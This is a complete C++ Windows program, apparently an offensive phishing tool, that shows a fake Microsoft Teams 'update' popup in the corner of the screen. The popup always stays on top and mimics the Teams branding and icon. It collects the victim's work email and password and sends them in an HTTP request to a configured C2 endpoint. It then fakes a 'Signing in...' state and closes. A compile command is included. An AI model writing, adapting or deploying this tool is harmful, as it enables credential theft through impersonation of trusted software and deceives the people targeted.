#define UNICODE
#define _UNICODE
#include <windows.h>
#include <commctrl.h>
#include <winhttp.h>
#include <gdiplus.h>
#include <string>
#include <iostream>

// compile exe - cl.exe /O2 /GL /DUNICODE /D_UNICODE /DNDEBUG /MD /EHsc toastcreds.cpp /link /LTCG /SUBSYSTEM:WINDOWS user32.lib gdi32.lib comctl32.lib winhttp.lib gdiplus.lib

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

// Window class name
const wchar_t CLASS_NAME[] = L"TeamsPhishWindow";

// Control IDs
#define ID_EMAIL_EDIT    1001
#define ID_PASS_EDIT     1002
#define ID_SIGNIN_BTN    1003
#define ID_DISMISS_BTN   1004
#define ID_CLOSE_BTN     1005

// Configuration
const wchar_t* C2_URL = L"http://127.0.0.1:8080";
const wchar_t* TEAMS_ICON_PATH = L".\\teams.ico";

// Global variables
HWND g_hEmailEdit, g_hPassEdit, g_hSignInBtn, g_hDismissBtn, g_hCloseBtn;
HBRUSH g_hDarkBrush, g_hHeaderBrush, g_hInputBrush;
HFONT g_hTitleFont, g_hNormalFont, g_hSmallFont;
Image* g_pTeamsIcon = nullptr;

// Function declarations
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void CreateControls(HWND hwnd);
void SendCredentialsToC2(const std::wstring& email, const std::wstring& password);
bool LoadTeamsIcon();
void DrawTeamsIcon(HDC hdc, int x, int y, int width, int height);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // Initialize common controls
    InitCommonControls();

    // Load Teams icon
    LoadTeamsIcon();

    // Register window class
    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = CreateSolidBrush(RGB(45, 45, 45));
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);

    if (!RegisterClass(&wc)) {
        std::wcout << L"[-] Failed to register window class" << std::endl;
        return 1;
    }

    // Get screen dimensions for positioning
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int windowWidth = 380;
    int windowHeight = 280;
    
    // Position in bottom-right corner
    int x = screenWidth - windowWidth - 20;
    int y = screenHeight - windowHeight - 60; // Account for taskbar

    // Create window
    HWND hwnd = CreateWindowEx(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW, // Always on top, no taskbar
        CLASS_NAME,
        L"Microsoft Teams",
        WS_POPUP, // Borderless
        x, y, windowWidth, windowHeight,
        NULL, NULL, hInstance, NULL
    );

    if (!hwnd) {
        std::wcout << L"[-] Failed to create window" << std::endl;
        return 1;
    }

    std::wcout << L"[+] Teams phishing popup created successfully" << std::endl;

    // Show and update window
    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);

    // Message loop
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    if (g_pTeamsIcon) delete g_pTeamsIcon;
    GdiplusShutdown(gdiplusToken);

    return 0;
}

bool LoadTeamsIcon() {
    if (GetFileAttributes(TEAMS_ICON_PATH) == INVALID_FILE_ATTRIBUTES) {
        std::wcout << L"[!] teams.ico not found - no icon will be displayed" << std::endl;
        return false;
    }

    g_pTeamsIcon = Image::FromFile(TEAMS_ICON_PATH);
    if (g_pTeamsIcon->GetLastStatus() != Ok) {
        std::wcout << L"[!] Failed to load teams.ico" << std::endl;
        delete g_pTeamsIcon;
        g_pTeamsIcon = nullptr;
        return false;
    }

    std::wcout << L"[+] Successfully loaded Teams icon" << std::endl;
    return true;
}

void DrawTeamsIcon(HDC hdc, int x, int y, int width, int height) {
    if (!g_pTeamsIcon) return;
    
    Graphics graphics(hdc);
    graphics.SetSmoothingMode(SmoothingModeAntiAlias);
    graphics.DrawImage(g_pTeamsIcon, x, y, width, height);
}

void CreateControls(HWND hwnd) {
    // Create fonts
    g_hTitleFont = CreateFont(16, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");

    g_hNormalFont = CreateFont(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");

    g_hSmallFont = CreateFont(12, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");

    // Create brushes
    g_hDarkBrush = CreateSolidBrush(RGB(45, 45, 45));
    g_hHeaderBrush = CreateSolidBrush(RGB(40, 40, 40));
    g_hInputBrush = CreateSolidBrush(RGB(35, 35, 35));

    // Email textbox
    g_hEmailEdit = CreateWindowEx(WS_EX_CLIENTEDGE,
        L"EDIT", L"",
        WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL,
        20, 125, 340, 25,
        hwnd, (HMENU)ID_EMAIL_EDIT, GetModuleHandle(NULL), NULL);
    SendMessage(g_hEmailEdit, WM_SETFONT, (WPARAM)g_hNormalFont, TRUE);

    // Password textbox
    g_hPassEdit = CreateWindowEx(WS_EX_CLIENTEDGE,
        L"EDIT", L"",
        WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | ES_PASSWORD,
        20, 190, 260, 25,
        hwnd, (HMENU)ID_PASS_EDIT, GetModuleHandle(NULL), NULL);
    SendMessage(g_hPassEdit, WM_SETFONT, (WPARAM)g_hNormalFont, TRUE);

    // Sign in button
    g_hSignInBtn = CreateWindow(L"BUTTON", L"Sign in",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_OWNERDRAW,
        290, 190, 70, 25,
        hwnd, (HMENU)ID_SIGNIN_BTN, GetModuleHandle(NULL), NULL);
    SendMessage(g_hSignInBtn, WM_SETFONT, (WPARAM)g_hSmallFont, TRUE);

    // Dismiss button
    g_hDismissBtn = CreateWindow(L"BUTTON", L"Dismiss",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_OWNERDRAW,
        20, 235, 340, 35,
        hwnd, (HMENU)ID_DISMISS_BTN, GetModuleHandle(NULL), NULL);
    SendMessage(g_hDismissBtn, WM_SETFONT, (WPARAM)g_hNormalFont, TRUE);

    // Close button
    g_hCloseBtn = CreateWindow(L"BUTTON", L"✕",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_OWNERDRAW,
        340, 10, 30, 25,
        hwnd, (HMENU)ID_CLOSE_BTN, GetModuleHandle(NULL), NULL);
    SendMessage(g_hCloseBtn, WM_SETFONT, (WPARAM)g_hNormalFont, TRUE);
}

void SendCredentialsToC2(const std::wstring& email, const std::wstring& password) {
    // Construct URL
    std::wstring url = std::wstring(C2_URL) + L"/creds?user=" + email + L"&pass=" + password;
    
    std::wcout << L"[+] CREDENTIALS CAPTURED: " << email << L" / " << password << std::endl;

    // Send HTTP GET request
    HINTERNET hSession = WinHttpOpen(L"TeamsClient/1.0", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession) {
        HINTERNET hConnect = WinHttpConnect(hSession, L"127.0.0.1", 8080, 0);
        
        if (hConnect) {
            std::wstring path = L"/creds?user=" + email + L"&pass=" + password;
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path.c_str(),
                NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

            if (hRequest) {
                BOOL result = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 
                    0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

                if (result && WinHttpReceiveResponse(hRequest, NULL)) {
                    std::wcout << L"[+] Credentials exfiltrated to C2!" << std::endl;
                } else {
                    std::wcout << L"[-] C2 request failed" << std::endl;
                }

                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
}

void HandleSignIn(HWND hwnd) {
    // Get credentials from textboxes
    wchar_t email[256] = {0};
    wchar_t password[256] = {0};
    
    GetWindowText(g_hEmailEdit, email, 256);
    GetWindowText(g_hPassEdit, password, 256);

    if (wcslen(email) > 0 && wcslen(password) > 0) {
        // Send to C2
        SendCredentialsToC2(email, password);

        // Update button text and disable
        SetWindowText(g_hSignInBtn, L"Signing in...");
        EnableWindow(g_hSignInBtn, FALSE);

        // Close after delay
        SetTimer(hwnd, 1, 2000, NULL);
    } else {
        // Flash red (simplified - just beep for now)
        MessageBeep(MB_ICONEXCLAMATION);
    }
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE:
            CreateControls(hwnd);
            break;

        case WM_COMMAND:
            switch (LOWORD(wParam)) {
                case ID_SIGNIN_BTN:
                    HandleSignIn(hwnd);
                    break;
                case ID_DISMISS_BTN:
                case ID_CLOSE_BTN:
                    std::wcout << L"[*] User dismissed/closed notification" << std::endl;
                    PostQuitMessage(0);
                    break;
            }
            break;

        case WM_TIMER:
            if (wParam == 1) {
                KillTimer(hwnd, 1);
                PostQuitMessage(0);
            }
            break;

        case WM_PAINT:
            {
                PAINTSTRUCT ps;
                HDC hdc = BeginPaint(hwnd, &ps);
                
                // Fill background
                RECT rect;
                GetClientRect(hwnd, &rect);
                FillRect(hdc, &rect, g_hDarkBrush);

                // Draw header background
                RECT headerRect = {0, 0, 380, 80};
                FillRect(hdc, &headerRect, g_hHeaderBrush);

                // Set text colors and background
                SetTextColor(hdc, RGB(255, 255, 255));
                SetBkColor(hdc, RGB(40, 40, 40));

                // Draw Teams icon if available
                int titleX = 20;
                if (g_pTeamsIcon) {
                    DrawTeamsIcon(hdc, 20, 20, 40, 40);
                    titleX = 75;
                }

                // Draw title
                SelectObject(hdc, g_hTitleFont);
                TextOut(hdc, titleX, 20, L"Microsoft Teams", 15);

                // Draw subtitle
                SelectObject(hdc, g_hSmallFont);
                SetTextColor(hdc, RGB(200, 200, 200));
                TextOut(hdc, titleX, 45, L"Microsoft Teams Update. Sign in to initiate the update in the background.", 52);

                // Draw labels
                SetBkColor(hdc, RGB(45, 45, 45));
                SetTextColor(hdc, RGB(180, 180, 180));
                TextOut(hdc, 20, 105, L"Work email", 10);
                TextOut(hdc, 20, 170, L"Password", 8);

                EndPaint(hwnd, &ps);
            }
            break;

        case WM_DRAWITEM:
            {
                LPDRAWITEMSTRUCT lpDrawItem = (LPDRAWITEMSTRUCT)lParam;
                if (lpDrawItem->CtlID == ID_SIGNIN_BTN) {
                    // Draw Sign in button
                    HBRUSH hBrush = CreateSolidBrush(RGB(109, 109, 255));
                    FillRect(lpDrawItem->hDC, &lpDrawItem->rcItem, hBrush);
                    DeleteObject(hBrush);

                    SetTextColor(lpDrawItem->hDC, RGB(255, 255, 255));
                    SetBkColor(lpDrawItem->hDC, RGB(109, 109, 255));
                    
                    wchar_t text[32];
                    GetWindowText((HWND)lpDrawItem->hwndItem, text, 32);
                    DrawText(lpDrawItem->hDC, text, -1, &lpDrawItem->rcItem, 
                        DT_CENTER | DT_VCENTER | DT_SINGLELINE);
                }
                else if (lpDrawItem->CtlID == ID_DISMISS_BTN) {
                    // Draw Dismiss button
                    HBRUSH hBrush = CreateSolidBrush(RGB(0, 168, 255));
                    FillRect(lpDrawItem->hDC, &lpDrawItem->rcItem, hBrush);
                    DeleteObject(hBrush);

                    SetTextColor(lpDrawItem->hDC, RGB(255, 255, 255));
                    SetBkColor(lpDrawItem->hDC, RGB(0, 168, 255));
                    DrawText(lpDrawItem->hDC, L"Dismiss", -1, &lpDrawItem->rcItem, 
                        DT_CENTER | DT_VCENTER | DT_SINGLELINE);
                }
                else if (lpDrawItem->CtlID == ID_CLOSE_BTN) {
                    // Draw Close button
                    HBRUSH hBrush = CreateSolidBrush(RGB(40, 40, 40));
                    FillRect(lpDrawItem->hDC, &lpDrawItem->rcItem, hBrush);
                    DeleteObject(hBrush);

                    SetTextColor(lpDrawItem->hDC, RGB(160, 160, 160));
                    SetBkColor(lpDrawItem->hDC, RGB(40, 40, 40));
                    DrawText(lpDrawItem->hDC, L"x", -1, &lpDrawItem->rcItem, 
                        DT_CENTER | DT_VCENTER | DT_SINGLELINE);
                }
            }
            break;

        case WM_KEYDOWN:
            if (wParam == VK_ESCAPE) {
                PostQuitMessage(0);
            }
            break;

        case WM_DESTROY:
            PostQuitMessage(0);
            break;

        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}
